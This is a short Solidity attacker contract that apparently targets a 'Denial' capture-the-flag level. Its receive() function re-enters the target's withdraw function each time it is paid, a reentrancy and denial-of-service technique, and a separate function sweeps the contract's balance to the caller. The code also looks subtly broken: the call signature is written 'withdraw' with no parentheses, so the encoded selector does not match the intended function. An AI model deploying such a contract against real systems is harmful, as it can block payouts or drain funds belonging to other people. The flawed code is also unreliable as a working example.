pragma solidity ^0.8.0;

contract DenialAttacker2 {
    address public denial;

    constructor(address _denial) {
        denial = _denial;
    }

    receive() external payable {
        (bool success, ) = denial.call(abi.encodeWithSignature("withdraw"));
        require(success, "Attacker reentrance failed");
    }

    function withdrawFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}